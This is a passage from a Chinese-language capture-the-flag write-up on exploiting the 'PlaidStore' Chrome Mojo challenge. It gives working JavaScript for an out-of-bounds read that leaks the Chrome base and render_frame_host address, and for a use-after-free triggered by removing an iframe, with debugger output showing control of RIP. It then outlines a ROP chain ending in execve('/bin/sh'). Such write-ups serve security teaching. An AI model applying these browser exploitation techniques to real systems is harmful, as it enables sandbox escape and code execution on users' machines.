
因为`PlaidStoreImpl`对象中有虚表指针以及`render_frame_host_`指针，我们就可以越界读把这些数据读出来，最终构造出来的代码如下。要提一个技巧就是搜寻地址是虚表指针因页对齐低三位地址以及高位都是确定的，通过这个方法可以大概率找到对象。

```js
async function Leak()
{
let plaidStorePtrList = [];
for(let i=0; i<0x200; i++) {
let p = blink.mojom.PlaidStore.getRemote(true);
await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
plaidStorePtrList.push(p);
}
let p = plaidStorePtrList[0];
let leakData = (await p.getData("xxxxx", 0x2000)).data
let u8 = new Uint8Array(leakData)
let u64 = new BigInt64Array(u8.buffer);
let vtableAddr = 0;
for(let i=0x28/8; i<u64.length; i++) {
let highAddr = u64[i]&BigInt(0xf00000000000)
let lowAddr = u64[i]&BigInt(0x000000000fff)
if((highAddr == BigInt(0x500000000000)) && lowAddr == BigInt(0x7a0)) {
vtableAddr = u64[i];
renderFrameHostAddr = u64[i+1];
break;
}
}
if(vtableAddr == 0 ) {
console.log("[-] no vaild addr found");
return;
}
chromeBaseAddr = vtableAddr - BigInt(0x9fb67a0);
console.log("[+] leak chrome base addr: "+hex(chromeBaseAddr));
console.log("[+] leak reander frame host addr: "+hex(renderFrameHostAddr));
}
Leak();
```

### `uaf` 利用

`uaf`漏洞利用则主要是通过在代码中构建`frame`，并将`frame`中的`PlaidStoreImpl`对象返回，然后关闭`frame`释放`render_frame_host`指针，最后使用`PlaidStoreImpl`对象来使用`render_frame_host_`来实现`uaf`。

先要搞清楚`render_frame_host`对象的大小，该对象由`RenderFrameHostFactory`类实现，可以通过下面的断点来看该对象的大小，可以看到对象大小为`0xc28`。

```asm
b content::RenderFrameHostFactory::Create
0x555559075a52 mov edi, 0xc28
0x555559075a57 call 0x55555ac584b0 <0x55555ac584b0>
```

再来看看怎么触发`uaf`，主要步骤包括：

* 调用`document.createElement`创建一个子`frame`，在`frame`中绑定`mojo`，并将`plaidStorePtrList`赋值给`window`，然后返回；

* 在父`frame`中注册`"DOMContentLoaded"`事件的监听函数，调用`uaf`函数创建对应的`pipe`;

* 准备和`render_frame_host`对象大小相同的内存（`0xc28`），把它全都初始化成`0x41`；

* 在父`frame`中获取子`frame`的`plaidStorePtrList`；

* 调用`frame.remove()`，释放掉子`frame`，这样在`browser`进程中`render_frame_host`对象被释放；

* 调用`StoreData`函数去`browser`进程中申请`0xc28`大小的内存，这样会将被释放的`render_frame_host`对象内存申请出来。同时该函数也会调用被释放指针`render_frame_host_`中的虚表函数，触发了`uaf`漏洞。

```js
function AddFrame()
{
let frame = document.createElement("iframe");
frame.srcdoc =
`<script src="mojo/public/js/mojo\_bindings\_lite.js"></script>
<script src="third\_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>
<script>
async function uaf()
{
// step 1 register mojo in child frame
let plaidStorePtrList = [];
for(let i=0; i<0x200; i++) {
let p = blink.mojom.PlaidStore.getRemote(true);
await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
plaidStorePtrList.push(p);
}
// return the plaidStorePtrList to parent frame
window.plaidStorePtrList = plaidStorePtrList;
return;
}
uaf();
</script>
`;
document.body.appendChild(frame);
return frame;
}
async function pwn()
{
let frame = AddFrame();
frame.contentWindow.addEventListener("DOMContentLoaded", async () => {
// trigger the pipe
await frame.contentWindow.uaf();
// prepare the memory
let renderFrameHostSize = 0xc28
frameBuf = new ArrayBuffer(renderFrameHostSize);
let frameData8 = new Uint8Array(frameBuf).fill(0x41);
// get the child frame
let plaidStorePtrList = frame.contentWindow.plaidStorePtrList;
// free the render\_frame\_host ptr
frame.remove();
// trying to malloc the freed render\_frame\_host memory and trigger the function.
let bins = [];
for(var i=0; i<0x1000; i++){
plaidStorePtrList[0].storeData("crash", frameData8);
}
})
}
pwn();
```

理论上最终`storeData`函数在执行`render_frame_host_->IsRenderFrameLive()`的时候，虚表指针已经被覆盖成了`0x414141410x41414141`会导致访存错误。

实际运行结果如下，可以看到会尝试调用`call [rax+0x160]`，是代码`render_frame_host_->IsRenderFrameLive()`的实现，我们所申请的内存成功控制了对象，并且数据可控`rip`。

```asm
Thread 1 "chrome" received signal SIGSEGV, Segmentation fault.
0x00005555591ac1e1 in content::PlaidStoreImpl::StoreData(std::\_\_1::basic\_string<char, std::\_\_1::char\_traits<char>, std::\_\_1::allocator<char> > const&, std::\_\_1::vector<unsigned char, std::\_\_1::allocator<unsigned char> > const&) ()
...
RAX 0x4141414141414141 ('AAAAAAAA')
RBX 0x28b732be0090 ◂— 0x4141414141414141 ('AAAAAAAA')
RCX 0x28b732be0090 ◂— 0x4141414141414141 ('AAAAAAAA')
...
► 0x5555591ac1e1 call qword ptr [rax + 0x160]
0x5555591ac1e7 test al, al
pwndbg> i r rax
rax 0x4141414141414141 0x4141414141414141
```

### 最终利用

有了对上面两个漏洞的理解，最终利用也就呼之欲出了，代码如下所示，主要流程是：

* 在子`frame`中利用`oob`漏洞泄露出程序基址以及`render_frame_host`对象地址；其中程序基址用于构造`rop`链,`render_frame_host`对象地址用于后续`uaf`漏洞利用；

* 准备`rop`链，因为跳转的时候`rax`是虚表指针且可控，因此可以将它指向上面泄露的`render_frame_host`对象地址同时在偏移为`0x160`的地方部署`stack pivot gadget`即`xchg rsp, rax`这样的`gadget`，然后就是常规的`rop`链。

* 触发`uaf`，成功控制程序流，最后执行`execve("/bin/sh")`或`execve("/bin/gnome-calculator")`。
